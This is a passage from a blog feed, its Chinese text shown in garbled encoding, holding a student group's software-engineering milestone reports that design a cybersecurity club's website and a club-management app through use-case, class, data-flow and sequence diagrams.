id="æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨"><a href="#æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨:"></a>æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%B4%BB%E5%8A%A8.png" alt="é¡ºåºå›¾_æŸ¥çœ‹æ‰€æœ‰æ´»åŠ¨"></p><h3 id="æŸ¥çœ‹æ‰€æœ‰ç¤¾å›¢"><a href="#æŸ¥çœ‹æ‰€æœ‰ç¤¾å›¢" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰ç¤¾å›¢:"></a>æŸ¥çœ‹æ‰€æœ‰ç¤¾å›¢:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%A4%BE%E5%9B%A2.png" alt="é¡ºåºå›¾_æŸ¥çœ‹æ‰€æœ‰ç¤¾å›¢"></p><h3 id="æŸ¥çœ‹å·²ç»æŠ¥åçš„æ´»åŠ¨"><a href="#æŸ¥çœ‹å·²ç»æŠ¥åçš„æ´»åŠ¨" class="headerlink" title="æŸ¥çœ‹å·²ç»æŠ¥åçš„æ´»åŠ¨:"></a>æŸ¥çœ‹å·²ç»æŠ¥åçš„æ´»åŠ¨:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%8A%A5%E5%90%8D%E7%9A%84%E6%B4%BB%E5%8A%A8.png" alt="é¡ºåºå›¾_æŸ¥çœ‹å·²æŠ¥åçš„æ´»åŠ¨"></p><h3 id="åŠ å…¥ç¤¾å›¢"><a href="#åŠ å…¥ç¤¾å›¢" class="headerlink" title="åŠ å…¥ç¤¾å›¢:"></a>åŠ å…¥ç¤¾å›¢:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E5%8A%A0%E5%85%A5%E7%A4%BE%E5%9B%A2.png" alt="é¡ºåºå›¾_åŠ å…¥ç¤¾å›¢"></p><h3 id="ç¤¾é•¿åˆ›å»ºæ´»åŠ¨"><a href="#ç¤¾é•¿åˆ›å»ºæ´»åŠ¨" class="headerlink" title="ç¤¾é•¿åˆ›å»ºæ´»åŠ¨:"></a>ç¤¾é•¿åˆ›å»ºæ´»åŠ¨:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E5%88%9B%E5%BB%BA%E6%B4%BB%E5%8A%A8.png" alt="é¡ºåºå›¾_ç¤¾é•¿åˆ›å»ºæ´»åŠ¨"></p><h3 id="ç¤¾é•¿è½¬è®©"><a href="#ç¤¾é•¿è½¬è®©" class="headerlink" title="ç¤¾é•¿è½¬è®©:"></a>ç¤¾é•¿è½¬è®©:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E8%BD%AC%E8%AE%A9.png" alt="é¡ºåºå›¾_ç¤¾é•¿è½¬è®©"></p><h2 id="APPç«¯"><a href="#APPç«¯" class="headerlink" title="APPç«¯:"></a>APPç«¯:</h2><p><img src="/images/2023_12_4_third_milestone/4f4b69ccef768c2f838880d3d7a8543.jpg" alt="4f4b69ccef768c2f838880d3d7a8543"></p><p><img src="/images/2023_12_4_third_milestone/5d4d03b8a7958ea1f3cb97980113db1.jpg" alt="5d4d03b8a7958ea1f3cb97980113db1"></p><p><img src="/images/2023_12_4_third_milestone/9fb199579e2f6aa550e4f8f66d06138.jpg" alt="9fb199579e2f6aa550e4f8f66d06138"></p><p><img src="/images/2023_12_4_third_milestone/2ebb597136e7ab2c88d2fc1103d2cad.jpg" alt="2ebb597136e7ab2c88d2fc1103d2cad"></p><p><img src="/images/2023_12_4_third_milestone/bbcebd8ab4eaea7360b797f9be0af4a.jpg" alt="bbcebd8ab4eaea7360b797f9be0af4a"></p><h2 id="ç½‘é¡µç«¯"><a href="#ç½‘é¡µç«¯" class="headerlink" title="ç½‘é¡µç«¯:"></a>ç½‘é¡µç«¯:</h2><p>ç½‘é¡µç«¯æ ¹æ®uiè®¾è®¡çš„åŸºç¡€ï¼Œè¿›è¡Œæ”¹å–„ä»è€Œå®Œæˆé¦–é¡µï¼Œåä¼šæˆå‘˜å’Œè”ç³»çš„ç•Œé¢:</p><h3 id="é¦–é¡µ"><a href="#é¦–é¡µ" class="headerlink" title="é¦–é¡µ:"></a>é¦–é¡µ:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203205816231.png" alt="image-20231203205816231"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205906126.png" alt="image-20231203205906126"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205939250.png" alt="image-20231203205939250"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203210003859.png" alt="image-20231203210003859"></p><h3 id="åä¼šæˆå‘˜"><a href="#åä¼šæˆå‘˜" class="headerlink" title="åä¼šæˆå‘˜:"></a>åä¼šæˆå‘˜:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210137947.png" alt="image-20231203210137947"></p><h3 id="è”ç³»"><a href="#è”ç³»" class="headerlink" title="è”ç³»:"></a>è”ç³»:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210236649.png" alt="image-20231203210236649"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„ç”¨ä¾‹å›¾ï¼Œç±»å›¾ï¼Œæµç¨‹å›¾ï¼Œé¡ºåºå›¾åˆ†æè®¾è®¡æŠ¥å‘Š</title>
    <link href="/2023/11/20/2023-11-20-second_milestone/"/>
    <url>/2023/11/20/2023-11-20-second_milestone/</url>
    
    <content type="html"><![CDATA[<h1 id="è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„ç”¨ä¾‹å›¾ï¼Œç±»å›¾ï¼Œæµç¨‹å›¾ï¼Œé¡ºåºå›¾åˆ†æè®¾è®¡æŠ¥å‘Š"><a href="#è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„ç”¨ä¾‹å›¾ï¼Œç±»å›¾ï¼Œæµç¨‹å›¾ï¼Œé¡ºåºå›¾åˆ†æè®¾è®¡æŠ¥å‘Š" class="headerlink" title="è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„ç”¨ä¾‹å›¾ï¼Œç±»å›¾ï¼Œæµç¨‹å›¾ï¼Œé¡ºåºå›¾åˆ†æè®¾è®¡æŠ¥å‘Š"></a>è½¯ä»¶å·¥ç¨‹ç¬¬äºŒç»„ç”¨ä¾‹å›¾ï¼Œç±»å›¾ï¼Œæµç¨‹å›¾ï¼Œé¡ºåºå›¾åˆ†æè®¾è®¡æŠ¥å‘Š</h1><h2 id="åˆ†å·¥"><a href="#åˆ†å·¥" class="headerlink" title="åˆ†å·¥:"></a>åˆ†å·¥:</h2><p>é«˜é“®ç”·:ç½‘é¡µç±»å›¾å’Œç”¨ä¾‹å›¾</p><p>èƒ¡çºªç¦:APPç±»å›¾å’Œç”¨ä¾‹å›¾</p><p>é™ˆå¸…:ç½‘é¡µç³»ç»Ÿçš„æ•°æ®æµå›¾</p><p>å‘¨è¯—ä¹”:APPç³»ç»Ÿçš„æ•°æ®æµå›¾</p><p>éŸ©æ±ä»£:APPç”¨ä¾‹çš„é¡ºåºå›¾</p><p>ç«ºæŸ¯æ°:ç½‘é¡µç”¨ä¾‹çš„é¡ºåºå›¾</p><h2 id="ç½‘ç»œç©ºé—´å®‰å…¨ç¤¾å›¢ç½‘é¡µ"><a href="#ç½‘ç»œç©ºé—´å®‰å…¨ç¤¾å›¢ç½‘é¡µ" class="headerlink" title="ç½‘ç»œç©ºé—´å®‰å…¨ç¤¾å›¢ç½‘é¡µ:"></a>ç½‘ç»œç©ºé—´å®‰å…¨ç¤¾å›¢ç½‘é¡µ:</h2><h3 id="ç”¨ä¾‹å›¾ï¼š"><a href="#ç”¨ä¾‹å›¾ï¼š" class="headerlink" title="ç”¨ä¾‹å›¾ï¼š"></a>ç”¨ä¾‹å›¾ï¼š</h3><p>æ ¹æ®ç½‘ç»œç©ºé—´å®‰å…¨ç¤¾å›¢çš„uiè®¾è®¡ç•Œé¢å¯¹ç”¨ä¾‹å›¾è¿›è¡Œåˆ†æè®¾è®¡ã€‚</p><h4 id="é¦–é¡µï¼š"><a href="#é¦–é¡µï¼š" class="headerlink" title="é¦–é¡µï¼š"></a>é¦–é¡µï¼š</h4><p>é¦–é¡µui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162312165.png" alt="image-20231118162312165"></p><p>é¦–é¡µçš„é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜ï¼Œç¤¾å‘˜åªæ‹¥æœ‰å¯¹é¦–é¡µçš„è§‚é˜…åŠŸèƒ½ï¼Œç®¡ç†å‘˜æ‹¥æœ‰è§‚é˜…åŠŸèƒ½å’Œå¯¹é¦–é¡µå†…å®¹ä¿®æ”¹çš„åŠŸèƒ½:</p><h5 id="é¦–é¡µç”¨ä¾‹å›¾"><a href="#é¦–é¡µç”¨ä¾‹å›¾" class="headerlink" title="é¦–é¡µç”¨ä¾‹å›¾:"></a>é¦–é¡µç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103811018.png" alt="image-20231120103811018"></p><h4 id="ç¤¾å›¢ä»‹ç»é¡µé¢"><a href="#ç¤¾å›¢ä»‹ç»é¡µé¢" class="headerlink" title="ç¤¾å›¢ä»‹ç»é¡µé¢:"></a>ç¤¾å›¢ä»‹ç»é¡µé¢:</h4><p>ç¤¾å›¢ä»‹ç»é¡µé¢ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162800500.png" alt="image-20231118162800500"></p><p>ç¤¾å›¢ä»‹ç»é¡µé¢é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜ï¼Œç¤¾å‘˜åªæ‹¥æœ‰å¯¹ç¤¾å›¢ä¿¡æ¯ã€å¥–é¡¹ã€äººå‘˜ä¿¡æ¯å’Œåˆç…§çš„è§‚é˜…åŠŸèƒ½ï¼Œç®¡ç†å‘˜é¢å¤–æ‹¥æœ‰å¯¹å½“å‰é¡µé¢çš„ä¿¡æ¯ä¿®æ”¹åŠŸèƒ½ã€‚</p><h5 id="ç¤¾å›¢ä»‹ç»ç•Œé¢ç”¨ä¾‹å›¾"><a href="#ç¤¾å›¢ä»‹ç»ç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="ç¤¾å›¢ä»‹ç»ç•Œé¢ç”¨ä¾‹å›¾:"></a>ç¤¾å›¢ä»‹ç»ç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103958045.png" alt="image-20231120103958045"></p><h4 id="ç¤¾å›¢å…¬å‘Šç•Œé¢ï¼š"><a href="#ç¤¾å›¢å…¬å‘Šç•Œé¢ï¼š" class="headerlink" title="ç¤¾å›¢å…¬å‘Šç•Œé¢ï¼š"></a>ç¤¾å›¢å…¬å‘Šç•Œé¢ï¼š</h4><p>ç¤¾å›¢å…¬å‘Šç•Œé¢uiï¼š<br><img src="/images/2023_11_20_second_milestone/image-20231118163635092.png" alt="image-20231118163635092"></p><p>ç¤¾å›¢ä»‹ç»é¡µé¢é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜ï¼Œç¤¾å‘˜åªæ‹¥æœ‰å¯¹ç½‘é¡µä¸­å…¬å‘Šçš„æŸ¥é˜…åŠŸèƒ½ï¼Œç®¡ç†å‘˜æ‹¥æœ‰é¢å¤–å¯¹å…¬å‘Šåˆ é™¤å’Œå‘å¸ƒçš„å…¬å‘Šå¤„ç†åŠŸèƒ½</p><h5 id="ç¤¾å›¢å…¬å‘Šç•Œé¢ç”¨ä¾‹å›¾"><a href="#ç¤¾å›¢å…¬å‘Šç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="ç¤¾å›¢å…¬å‘Šç•Œé¢ç”¨ä¾‹å›¾:"></a>ç¤¾å›¢å…¬å‘Šç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104419813.png" alt="image-20231120104419813"></p><h4 id="ç«èµ›ä¸­å¿ƒç•Œé¢"><a href="#ç«èµ›ä¸­å¿ƒç•Œé¢" class="headerlink" title="ç«èµ›ä¸­å¿ƒç•Œé¢:"></a>ç«èµ›ä¸­å¿ƒç•Œé¢:</h4><p>ç«èµ›ä¸­å¿ƒç•Œé¢ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118164809014.png" alt="image-20231118164809014"></p><p>ç¤¾å›¢ä»‹ç»é¡µé¢é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜,ç¤¾å‘˜å¯ä»¥æŸ¥é˜…å…¬å¼€èµ›ã€å†…éƒ¨èµ›çš„ä¿¡æ¯å’Œè‡ªå·±å·²ç»æŠ¥åçš„ç«èµ›ä¿¡æ¯ï¼Œç®¡ç†å‘˜æ‹¥æœ‰å¯¹å…¬å¼€èµ›å’Œå†…éƒ¨èµ›çš„æŸ¥é˜…åŠŸèƒ½ï¼Œä»¥åŠåˆ é™¤ç«èµ›æ´»åŠ¨å’Œå‘å¸ƒç«èµ›æ´»åŠ¨çš„æ´»åŠ¨å¤„ç†åŠŸèƒ½:</p><h5 id="ç«èµ›ä¸­å¿ƒç•Œé¢ç”¨ä¾‹å›¾"><a href="#ç«èµ›ä¸­å¿ƒç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="ç«èµ›ä¸­å¿ƒç•Œé¢ç”¨ä¾‹å›¾:"></a>ç«èµ›ä¸­å¿ƒç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104605766.png" alt="image-20231120104605766"></p><h4 id="é“¾æ¥ç•Œé¢"><a href="#é“¾æ¥ç•Œé¢" class="headerlink" title="é“¾æ¥ç•Œé¢:"></a>é“¾æ¥ç•Œé¢:</h4><p>é“¾æ¥ç•Œé¢ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118183712830.png" alt="image-20231118183712830"></p><p>ç¤¾å›¢ä»‹ç»é¡µé¢é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜,ç¤¾å‘˜åªæœ‰å¯¹åšå®¢é“¾æ¥ã€èµ„æºå’Œè”ç³»æˆ‘ä»¬çš„æŸ¥é˜…åŠŸèƒ½ï¼Œç®¡ç†å‘˜æ‹¥æœ‰å¯¹åšå®¢é“¾æ¥ä¿¡æ¯ï¼Œèµ„æºä¿¡æ¯ï¼Œè”ç³»æˆ‘ä»¬çš„ä¿¡æ¯çš„å¤„ç†åŠŸèƒ½</p><h5 id="é“¾æ¥ç•Œé¢ç”¨ä¾‹å›¾"><a href="#é“¾æ¥ç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="é“¾æ¥ç•Œé¢ç”¨ä¾‹å›¾:"></a>é“¾æ¥ç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104753303.png" alt="image-20231120104753303"></p><h4 id="ç»ƒä¹ åœºç•Œé¢"><a href="#ç»ƒä¹ åœºç•Œé¢" class="headerlink" title="ç»ƒä¹ åœºç•Œé¢:"></a>ç»ƒä¹ åœºç•Œé¢:</h4><p>ç»ƒä¹ åœºç•Œé¢ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118185058785.png" alt="image-20231118185058785"></p><p>ç¤¾å›¢ä»‹ç»é¡µé¢é¢å‘ç¤¾å‘˜å’Œç®¡ç†å‘˜ï¼Œä¸¤ç±»äººå‘˜,ç¤¾å‘˜æ‹¥æœ‰å¯¹å„ç±»é¢˜å‹é¢˜ç›®çš„æŸ¥é˜…åŠŸèƒ½ï¼Œå¯¹é¢˜ç›®çš„æ‰“å¼€å’Œæµ‹è¯•ï¼Œä»¥åŠå¯¹æŒ‡å®šé¢˜ç›®çš„æœç´¢åŠŸèƒ½ï¼Œç®¡ç†å‘˜æ‹¥æœ‰é¢å¤–å¯¹é¢˜ç›®çš„å‘å¸ƒå’Œåˆ é™¤åŠŸèƒ½</p><h5 id="ç»ƒä¹ åœºç•Œé¢ç”¨ä¾‹å›¾"><a href="#ç»ƒä¹ åœºç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="ç»ƒä¹ åœºç•Œé¢ç”¨ä¾‹å›¾:"></a>ç»ƒä¹ åœºç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118193056383.png" alt="image-20231118193056383"></p><h4 id="ä¸ªäººä¸­å¿ƒç•Œé¢"><a href="#ä¸ªäººä¸­å¿ƒç•Œé¢" class="headerlink" title="ä¸ªäººä¸­å¿ƒç•Œé¢:"></a>ä¸ªäººä¸­å¿ƒç•Œé¢:</h4><p>ä¸ªäººä¸­å¿ƒç•Œé¢ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118193527654.png" alt="image-20231118193527654"></p><p>ä¸ªäººä¸­å¿ƒçš„æ“ä½œç•Œé¢ï¼Œåªé¢å‘ç¤¾å‘˜ï¼Œç¤¾å‘˜æ‹¥æœ‰å¯¹è¯¥ç•Œé¢çš„æŸ¥é˜…å’Œç¼–è¾‘ä¸ªäººä¿¡æ¯çš„åŠŸèƒ½</p><h5 id="ä¸ªäººä¿¡æ¯ç•Œé¢ç”¨ä¾‹å›¾"><a href="#ä¸ªäººä¿¡æ¯ç•Œé¢ç”¨ä¾‹å›¾" class="headerlink" title="ä¸ªäººä¿¡æ¯ç•Œé¢ç”¨ä¾‹å›¾:"></a>ä¸ªäººä¿¡æ¯ç•Œé¢ç”¨ä¾‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118195032429.png" alt="image-20231118195032429"></p><h3 id="ç±»å›¾"><a href="#ç±»å›¾" class="headerlink" title="ç±»å›¾:"></a>ç±»å›¾:</h3><h5 id="é¦–é¡µç±»å›¾"><a href="#é¦–é¡µç±»å›¾" class="headerlink" title="é¦–é¡µç±»å›¾:"></a>é¦–é¡µç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118212000182.png" alt="image-20231118212000182"></p><h5 id="ç¤¾å›¢ä»‹ç»é¡µé¢ç±»å›¾"><a href="#ç¤¾å›¢ä»‹ç»é¡µé¢ç±»å›¾" class="headerlink" title="ç¤¾å›¢ä»‹ç»é¡µé¢ç±»å›¾:"></a>ç¤¾å›¢ä»‹ç»é¡µé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118225249988.png" alt="image-20231118225249988"></p><h5 id="ç¤¾å›¢å…¬å‘Šç•Œé¢ç±»å›¾"><a href="#ç¤¾å›¢å…¬å‘Šç•Œé¢ç±»å›¾" class="headerlink" title="ç¤¾å›¢å…¬å‘Šç•Œé¢ç±»å›¾:"></a>ç¤¾å›¢å…¬å‘Šç•Œé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118231142322.png" alt="image-20231118231142322"></p><h5 id="ç«èµ›ä¸­å¿ƒç•Œé¢ç±»å›¾"><a href="#ç«èµ›ä¸­å¿ƒç•Œé¢ç±»å›¾" class="headerlink" title="ç«èµ›ä¸­å¿ƒç•Œé¢ç±»å›¾:"></a>ç«èµ›ä¸­å¿ƒç•Œé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119012614739.png" alt="image-20231119012614739"></p><h5 id="é“¾æ¥ç•Œé¢ç±»å›¾"><a href="#é“¾æ¥ç•Œé¢ç±»å›¾" class="headerlink" title="é“¾æ¥ç•Œé¢ç±»å›¾:"></a>é“¾æ¥ç•Œé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119013509291.png" alt="image-20231119013509291"></p><h5 id="ç»ƒä¹ åœºç•Œé¢ç±»å›¾"><a href="#ç»ƒä¹ åœºç•Œé¢ç±»å›¾" class="headerlink" title="ç»ƒä¹ åœºç•Œé¢ç±»å›¾:"></a>ç»ƒä¹ åœºç•Œé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119130001581.png" alt="image-20231119130001581"></p><h5 id="ä¸ªäººä¸­å¿ƒç•Œé¢ç±»å›¾"><a href="#ä¸ªäººä¸­å¿ƒç•Œé¢ç±»å›¾" class="headerlink" title="ä¸ªäººä¸­å¿ƒç•Œé¢ç±»å›¾:"></a>ä¸ªäººä¸­å¿ƒç•Œé¢ç±»å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119131536125.png" alt="image-20231119131536125"></p><h3 id="ç½‘é¡µçš„æ•°æ®æµå›¾"><a href="#ç½‘é¡µçš„æ•°æ®æµå›¾" class="headerlink" title="ç½‘é¡µçš„æ•°æ®æµå›¾:"></a>ç½‘é¡µçš„æ•°æ®æµå›¾:</h3><h5 id="Gooseç½‘ç«™æ•°æ®æµç¨‹å›¾"><a href="#Gooseç½‘ç«™æ•°æ®æµç¨‹å›¾" class="headerlink" title="Gooseç½‘ç«™æ•°æ®æµç¨‹å›¾:"></a>Gooseç½‘ç«™æ•°æ®æµç¨‹å›¾:</h5><p><img src="/images/2023_11_20_second_milestone/wps1-1700442602419-1.jpg" alt="img"> </p><p>é¢˜åº“ä¿¡æ¯ç®¡ç†ï¼š</p><p>ç®¡ç†å‘˜å‘å‡ºå¯¹åº”çš„é¢˜ç›®ä¿¡æ¯è¿›å…¥é¢˜åº“ï¼Œç¤¾å‘˜å¯ä»¥æ‹‰å–å¯¹åº”çš„é¢˜ç›®ï¼Œç„¶åå®Œæˆåå¯ä»¥å¡«å†™ç­”æ¡ˆï¼Œç³»ç»Ÿåˆ¤æ–­ç­”æ¡ˆå¯¹é”™ï¼Œå°†å¯¹åº”çš„åˆ¤æ–­ä¿¡æ¯è¿”å›</p><p>ç½‘é¡µå…¬å‘Šç®¡ç†ï¼š</p><p>ç¤¾å›¢ä¼šå‘å¸ƒå„ç§å„æ ·çš„å…¬å‘Šï¼Œç®¡ç†å‘˜å°†å¯¹åº”çš„å…¬å‘Šä¿¡æ¯å‘å¸ƒï¼Œä»¥ä¾¿ç¤¾å‘˜èƒ½æµè§ˆ</p><p>ç«èµ›ä¿¡æ¯ç®¡ç†ï¼š</p><p>ç¤¾å›¢ä¸¾åŠç½‘ç»œå®‰å…¨èµ›äº‹ï¼Œç®¡ç†å‘˜å°†èµ›äº‹ä¿¡æ¯å½•å…¥ï¼Œå½•å…¥åç¤¾å‘˜å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚æŠ¥åï¼ŒæŠ¥åä¿¡æ¯è¿›å…¥ç«èµ›æŠ¥åå®¡æ‰¹è¡¨ï¼Œç®¡ç†å‘˜è¿›è¡Œå®¡æ‰¹ï¼Œå®¡æ‰¹åå°†å¯¹åº”çš„å®¡æ‰¹ä¿¡æ¯å‘é€ç»™ç¤¾å‘˜</p><p>ä¸ªäººä¿¡æ¯ç®¡ç†ï¼š</p><p>ç¤¾å‘˜å¯ä»¥ç®¡ç†è‡ªå·±ä¸ªäººä¿¡æ¯ï¼ŒåŒæ—¶å…¶å®ƒç¤¾å‘˜ä¹Ÿå¯ä»¥è®¿é—®ç¤¾å‘˜ç©ºé—´ï¼ŒæŸ¥çœ‹èƒ½å±•ç¤ºçš„ä¸ªäººä¿¡æ¯</p><p>ç¤¾å›¢ä¿¡æ¯ç®¡ç†ï¼š</p><p>ç®¡ç†å‘˜å‘å¸ƒç¤¾å›¢ä¿¡æ¯ï¼Œè¯¸å¦‚ç¤¾å›¢è·å¥–æƒ…å†µï¼Œç¤¾å›¢è¿‘ç…§ï¼Œç¤¾å‘˜å¯ä»¥æŸ¥çœ‹</p><h3 id="ç½‘é¡µç”¨ä¾‹çš„é¡ºåºå›¾"><a href="#ç½‘é¡µç”¨ä¾‹çš„é¡ºåºå›¾" class="headerlink" title="ç½‘é¡µç”¨ä¾‹çš„é¡ºåºå›¾:"></a>ç½‘é¡µç”¨ä¾‹çš„é¡ºåºå›¾:</h3><h5 id="ä¸ªäººä¸­ä¸­å¿ƒä¿¡æ¯ä¿®æ”¹ï¼š"><a href="#ä¸ªäººä¸­ä¸­å¿ƒä¿¡æ¯ä¿®æ”¹ï¼š" class="headerlink" title="ä¸ªäººä¸­ä¸­å¿ƒä¿¡æ¯ä¿®æ”¹ï¼š"></a>ä¸ªäººä¸­ä¸­å¿ƒä¿¡æ¯ä¿®æ”¹ï¼š</h5><p><img src="/images/2023_11_20_second_milestone/wps2-1700442695271-5.jpg" alt="img"> </p><p>ç¤¾å‘˜åœ¨ä¸ªäººä¿¡æ¯é¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹å§“åæ–¹æ³•å»ä¿®æ”¹ä¿¡æ¯ï¼Œé€šè¿‡è·å–å§“åæ–¹æ³•è·å¾—æ–°çš„å§“å</p><h5 id="å…¬å¼€èµ›æ´»åŠ¨åˆ é™¤ï¼š"><a href="#å…¬å¼€èµ›æ´»åŠ¨åˆ é™¤ï¼š" class="headerlink" title="å…¬å¼€èµ›æ´»åŠ¨åˆ é™¤ï¼š"></a>å…¬å¼€èµ›æ´»åŠ¨åˆ é™¤ï¼š</h5><p><img src="/images/2023_11_20_second_milestone/wps3-1700442695271-6.jpg" alt="img"> </p><p>ç®¡ç†å‘˜è¿›å…¥ç«èµ›ä¸­å¿ƒé¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹å…¬å¼€èµ›æ´»åŠ¨è¿›å…¥å…¬å¼€èµ›é¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹å½“å‰é¡µé¢æ´»åŠ¨è¿›å…¥å…¬å¼€èµ›æ´»åŠ¨åˆé›†ï¼Œä¿®æ”¹æ´»åŠ¨å†…å®¹ã€‚é€šè¿‡è·å–æ´»åŠ¨å†…å®¹ã€è·å–å½“å‰é¡µé¢æ´»åŠ¨ã€è·å–å…¬å¼€èµ›æ´»åŠ¨è·å¾—æ–°çš„æ´»åŠ¨ä¿¡æ¯ã€‚</p><h5 id="æ›´æ”¹å…¬å‘Šæ ‡é¢˜ï¼š"><a href="#æ›´æ”¹å…¬å‘Šæ ‡é¢˜ï¼š" class="headerlink" title="æ›´æ”¹å…¬å‘Šæ ‡é¢˜ï¼š"></a>æ›´æ”¹å…¬å‘Šæ ‡é¢˜ï¼š</h5><p><img src="/images/2023_11_20_second_milestone/wps4-1700442695270-4.jpg" alt="img"> </p><p>ç®¡ç†å‘˜è¿›å…¥ç¤¾å›¢å…¬å‘Šé¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹å…¬å‘Šæ ‡é¢˜æ–¹æ³•æ›´æ”¹å…¬å‘Šæ ‡é¢˜ï¼Œé€šè¿‡è·å–å…¬å‘Šæ ‡é¢˜æ–¹æ³•è·å–æ–°çš„ç¤¾å›¢å…¬å‘Šæ ‡é¢˜ï¼Œå†é€šè¿‡è·å–å½“å‰é¡µé¢å…¬å‘Šæ–¹æ³•è·å–æ–°ä¿¡æ¯</p><h5 id="ç¤¾å›¢ä»‹ç»ä¿¡æ¯ä¿®æ”¹ï¼š"><a href="#ç¤¾å›¢ä»‹ç»ä¿¡æ¯ä¿®æ”¹ï¼š" class="headerlink" title="ç¤¾å›¢ä»‹ç»ä¿¡æ¯ä¿®æ”¹ï¼š"></a>ç¤¾å›¢ä»‹ç»ä¿¡æ¯ä¿®æ”¹ï¼š</h5><p><img src="/images/2023_11_20_second_milestone/wps5-1700442695270-3.jpg" alt="img"> </p><p>ç®¡ç†å‘˜è¿›å…¥ç¤¾å›¢ä»‹ç»é¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹ç¤¾å›¢å¹²éƒ¨ä¿¡æ¯æ–¹æ³•è¿›å…¥äººå‘˜ä¿¡æ¯é¡µé¢ï¼Œé€šè¿‡ä¿®æ”¹å§“åæ–¹æ³•ä¿®æ”¹å¹²éƒ¨å§“åï¼Œå†é€šè¿‡è·å–å§“åã€è·å–ç¤¾å›¢å¹²éƒ¨ä¿¡æ¯ã€è·å–é¡µé¢åç§°è·å–æ–°ä¿¡æ¯</p><h5 id="ç»ƒä¹ åœºé¢˜ç›®ä¸Šä¼ ï¼š"><a href="#ç»ƒä¹ åœºé¢˜ç›®ä¸Šä¼ ï¼š" class="headerlink" title="ç»ƒä¹ åœºé¢˜ç›®ä¸Šä¼ ï¼š"></a>ç»ƒä¹ åœºé¢˜ç›®ä¸Šä¼ ï¼š</h5><p><img src="/images/2023_11_20_second_milestone/wps6-1700442695271-7.jpg" alt="img"> </p><p>ç®¡ç†å‘˜æ‰“å¼€ç»ƒä¹ åœºé¡µé¢ï¼ŒæŸ¥çœ‹é¢˜ç›®åˆ—è¡¨ï¼Œé€šè¿‡ä¸ŠåºŠé¢˜ç›®å°†é¢˜ç›®ä¸Šä¼ æ•°æ®åº“ï¼Œåœ¨ç»ƒä¹ åœºé¡µé¢è·å–æ–°çš„é¢˜ç›®åˆ—è¡¨ã€‚</p><h2 id="ç¤¾å›¢ç®¡ç†APP-iClub"><a href="#ç¤¾å›¢ç®¡ç†APP-iClub" class="headerlink" 